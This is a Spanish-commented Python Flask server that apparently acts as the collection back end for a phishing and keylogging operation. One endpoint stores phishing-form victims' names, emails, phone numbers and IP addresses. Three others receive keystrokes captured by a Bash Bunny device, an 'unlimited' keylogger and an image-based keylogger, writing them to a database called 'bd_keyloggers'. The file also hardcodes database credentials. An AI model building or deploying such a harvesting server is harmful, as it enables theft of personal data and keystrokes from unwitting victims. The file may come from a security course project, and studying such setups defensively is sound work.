from flask import Flask, request, jsonify





from flask_cors import CORS





import mysql.connector





from datetime import datetime



import pytz #Hora Española







app = Flask(__name__)





CORS(app)  # Permite solicitudes desde cualquier origen







# Configuración de MySQL





db_config = {





    "host": "mysql-db",





    "user": "sea",





    "password": "proyectose@",





    "database": "bd_keyloggers"





}







#Phishing



# Ruta para guardar datos del formulario



@app.route('/guardar-formulario', methods=['POST'])





def guardar_formulario():





    data = request.json





    if not data:





        return jsonify({"error": "Solicitud vacía"}), 400







    nombre_apellidos = data.get("nombre_apellidos")





    email = data.get("email")





    telefono = data.get("telefono")





    ip_cliente = request.headers.get("X-Forwarded-For") or request.remote_addr





    zona = pytz.timezone('Europe/Madrid')



    fecha = datetime.now(zona).strftime('%Y-%m-%d %H:%M:%S')









    if not nombre_apellidos or not email or not telefono:





        return jsonify({"error": "Faltan campos requeridos"}), 400







    conexion = None





    cursor = None







    try:





        conexion = mysql.connector.connect(**db_config)





        cursor = conexion.cursor()





        query = """





            INSERT INTO phishing (fecha, ip, nombre_apellidos, email, telefono)





            VALUES (%s, %s, %s, %s, %s)





        """





        cursor.execute(query, (fecha, ip_cliente, nombre_apellidos, email, telefono))





        conexion.commit()





        return jsonify({"mensaje": "Formulario guardado correctamente"})







    except mysql.connector.Error as error:





        return jsonify({"error": f"Error en base de datos: {error}"}), 500







    finally:





        if cursor:





            cursor.close()





        if conexion:





            conexion.close()







# Bash Bunny



@app.route('/guardar-bashbunny', methods=['POST'])





def guardar_bashbunny():





    data = request.json



    if not data:



        return jsonify({"error": "Cuerpo de la solicitud vacío"}), 400





    datos = data.get("datos")



    ip_cliente = request.headers.get("X-Forwarded-For") or request.remote_addr





    if not datos:



        return jsonify({"error": "Datos inválidos"}), 400







    try:



        conexion = mysql.connector.connect(**db_config)





        cursor = conexion.cursor()



        zona = pytz.timezone('Europe/Madrid')

        fecha = datetime.now(zona).strftime('%Y-%m-%d %H:%M:%S')

        query = "INSERT INTO keylogger (fecha, ip, tecla, tipo) VALUES (%s, %s, %s, 'B')"





        cursor.execute(query, (fecha, ip_cliente, datos))





        conexion.commit()





        return jsonify({"mensaje": "Datos guardados en Keylogger (Bash Bunny)"})







    except mysql.connector.Error as error:





        return jsonify({"error": f"Error en la base de datos: {error}"}), 500







    finally:





        if cursor:





            cursor.close()





        if conexion:





            conexion.close()







# Ilimitado



@app.route('/guardar-real', methods=['POST'])





def guardar_real():



    data = request.json





    if not data:



        return jsonify({"error": "Cuerpo de la solicitud vacío"}), 400







    datosreal = data.get("datosreal")

    ip_cliente = request.headers.get("X-Forwarded-For") or request.remote_addr







    if not datosreal:





        return jsonify({"error": "Datos inválidos"}), 400







    try:





        conexion = mysql.connector.connect(**db_config)



        cursor = conexion.cursor()





        zona = pytz.timezone('Europe/Madrid')

        fecha = datetime.now(zona).strftime('%Y-%m-%d %H:%M:%S')

        query = "INSERT INTO keylogger (fecha, ip, tecla, tipo) VALUES (%s, %s, %s, 'R')"



        cursor.execute(query, (fecha, ip_cliente, datosreal))





        conexion.commit()





        return jsonify({"mensaje": "Datos guardados en Keylogger (Ilimitado)"})







    except mysql.connector.Error as error:





        return jsonify({"error": f"Error en la base de datos: {error}"}), 500







    finally:





        if cursor:





            cursor.close()





        if conexion:





            conexion.close()







# Imagen

@app.route('/guardar-img', methods=['POST'])





def guardar_img():





    data = request.json





    if not data:





        return jsonify({"error": "Cuerpo de la solicitud vacío"}), 400







    datosImg = data.get("datosImg")





    ip_cliente = request.headers.get("X-Forwarded-For") or request.remote_addr









    if not datosImg:





        return jsonify({"error": "Datos inválidos"}), 400







    try:





        conexion = mysql.connector.connect(**db_config)





        cursor = conexion.cursor()





        zona = pytz.timezone('Europe/Madrid')



        fecha = datetime.now(zona).strftime('%Y-%m-%d %H:%M:%S')



        query = "INSERT INTO keylogger (fecha, ip, tecla, tipo) VALUES (%s, %s, %s, 'I')"



        cursor.execute(query, (fecha, ip_cliente, datosImg))





        conexion.commit()





        return jsonify({"mensaje": "Datos guardados en Keylogger"})







    except mysql.connector.Error as error:





        return jsonify({"error": f"Error en la base de datos: {error}"}), 500







    finally:


        if cursor:

            cursor.close()





        if conexion:

            conexion.close()



if __name__ == '__main__':



    app.run(host='0.0.0.0', port=5000)

